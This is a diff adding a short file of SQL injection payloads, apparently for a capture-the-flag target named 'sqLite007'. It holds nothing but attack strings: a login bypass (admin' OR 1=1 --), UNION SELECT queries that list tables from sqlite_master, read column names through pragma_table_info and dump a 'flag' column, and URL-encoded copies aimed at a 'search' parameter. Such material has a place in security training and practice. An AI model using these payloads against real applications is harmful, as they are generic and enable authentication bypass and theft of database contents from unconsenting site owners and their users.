@@ -1,0 +1,25 @@
+=== SQL Injection Payloads for sqLite007 ===
+
+1. Authentication Bypass (Login):
+   admin' OR '1'='1
+   OR
+   admin' OR 1=1 --
+
+2. Extract Table Names:
+   %' UNION SELECT NULL,NULL,NULL,group_concat(name,','),NULL FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--
+
+3. Get Column Names from 'general' table:
+   %' UNION SELECT NULL,NULL,NULL,group_concat(name,','),NULL FROM pragma_table_info('general')--
+
+4. Extract Flag:
+   %' UNION SELECT NULL,NULL,NULL,group_concat(CAST(flag AS TEXT),','),NULL FROM general--
+
+=== URL Encoded Versions ===
+
+1. Extract Tables:
+   search=%25%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cgroup_concat%28name%2C%27%2C%27%29%2CNULL+FROM+sqlite_master+WHERE+type%3D%27table%27+AND+name+NOT+LIKE+%27sqlite_%25%27--&database=activity_logs
+
+2. Get Flag:
+   search=%25%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cgroup_concat%28CAST%28flag+AS+TEXT%29%2C%27%2C%27%29%2CNULL+FROM+general--&database=activity_logs
+
+
